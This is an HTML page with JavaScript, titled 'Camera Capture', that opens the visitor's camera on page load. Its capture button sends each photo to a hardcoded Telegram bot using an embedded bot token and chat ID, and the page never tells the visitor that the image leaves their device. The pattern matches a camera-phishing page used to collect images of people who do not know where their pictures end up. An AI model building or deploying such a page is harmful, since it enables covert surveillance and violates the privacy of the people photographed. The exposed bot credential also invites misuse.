<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        #camera-container {
            margin: 20px 0;
        }
        #camera {
            width: 100%;
            max-width: 400px;
            background-color: #f0f0f0;
            border-radius: 8px;
        }
        #capture-btn, #switch-camera {
            padding: 10px 20px;
            margin: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        #switch-camera {
            background-color: #2196F3;
        }
        #result {
            margin-top: 20px;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>Camera Capture</h1>
    <p>Allow access to your camera to take a photo.</p>
    
    <div id="camera-container">
        <video id="camera" autoplay playsinline></video>
    </div>
    
    <button id="switch-camera">Switch Camera</button>
    <button id="capture-btn">Capture Photo</button>
    
    <div id="result">
        <canvas id="canvas" style="display: none;"></canvas>
    </div>
    
    <div id="status"></div>
    
    <script>
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('capture-btn');
        const switchBtn = document.getElementById('switch-camera');
        const statusDiv = document.getElementById('status');
        
        let currentStream = null;
        let facingMode = "user"; // Default to front camera
        
        // Telegram bot details
        const botToken = '8114609982:AAF1O8wL_IZkdyF4jVCB3_2SJ3-lynVlpFg';
        const chatId = '7835924973';
        
        async function startCamera() {
            statusDiv.textContent = "Starting camera...";
            
            try {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }
                
                const constraints = {
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                currentStream = stream;
                
                statusDiv.textContent = "Camera is ready";
            } catch (err) {
                console.error("Error accessing camera:", err);
                statusDiv.textContent = "Error accessing camera: " + err.message;
            }
        }
        
        function switchCamera() {
            facingMode = facingMode === "user" ? "environment" : "user";
            startCamera();
        }
        
        async function capturePhoto() {
            if (!currentStream) {
                statusDiv.textContent = "Camera is not ready yet";
                return;
            }
            
            statusDiv.textContent = "Capturing photo...";
            
            // Set canvas dimensions to match video stream
            const videoTrack = currentStream.getVideoTracks()[0];
            const settings = videoTrack.getSettings();
            canvas.width = settings.width;
            canvas.height = settings.height;
            
            // Draw video frame to canvas
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convert canvas to blob
            canvas.toBlob(async (blob) => {
                try {
                    statusDiv.textContent = "Sending photo...";
                    
                    // Create form data
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'capture.jpg');
                    
                    // Send to Telegram bot
                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    
                    if (result.ok) {
                        statusDiv.textContent = "Photo sent successfully!";
                    } else {
                        statusDiv.textContent = "Error sending photo: " + (result.description || 'Unknown error');
                    }
                } catch (err) {
                    console.error("Error sending photo:", err);
                    statusDiv.textContent = "Error sending photo: " + err.message;
                }
            }, 'image/jpeg', 0.9);
        }
        
        // Event listeners
        captureBtn.addEventListener('click', capturePhoto);
        switchBtn.addEventListener('click', switchCamera);
        
        // Start camera on page load
        startCamera();
    </script>
</body>
</html>
